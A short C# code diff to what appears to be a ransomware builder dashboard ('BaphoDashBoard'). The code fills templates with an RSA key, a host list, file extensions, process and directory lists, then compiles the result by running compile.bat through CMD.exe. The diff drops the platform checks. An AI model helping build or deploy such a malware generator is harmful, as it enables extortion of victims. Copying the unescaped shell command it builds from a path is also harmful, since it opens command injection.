@@ -15,7 +15,6 @@ using System.Diagnostics;
 using Microsoft.AspNetCore.Http;
 using System.Text;
 using System.Security.Cryptography;
-using System.Runtime.InteropServices;
 
 namespace BaphoDashBoard.DAL.Services
 {
@@ -253,22 +252,10 @@ namespace BaphoDashBoard.DAL.Services
                 var draw_processes = await DrawParameters(Path.Combine(output_path, "Utilities"), "Diagnostics.cs", "<processes list here>", model);
                 var draw_dirs = await DrawParameters(output_path, "Program.cs", "<dirs list here>", model);
 
-                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+                if (draw_rsa_key.success == true && draw_host_list.success == true && draw_extensions.success == true && draw_processes.success == true && draw_dirs.success == true)
                 {
-                    if (draw_rsa_key.success == true && draw_host_list.success == true && draw_extensions.success == true && draw_processes.success == true && draw_dirs.success == true)
-                    {
-                        var strCmdText = "/K cd " + output_path + " & compile.bat";
-                        Process.Start("CMD.exe", strCmdText).WaitForExit();
-                    }
-                }
-
-                if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
-                {
-                    if (draw_rsa_key.success == true && draw_host_list.success == true && draw_extensions.success == true && draw_processes.success == true && draw_dirs.success == true)
-                    {
-                        var strCmdText = "/K cd " + output_path + " & compile.bat";
-                        Process.Start("bash", strCmdText).WaitForExit();
-                    }
+                    var strCmdText = "/K cd " + output_path + " & compile.bat";
+                    Process.Start("CMD.exe", strCmdText).WaitForExit();
                 }
             }
             catch(Exception ex)
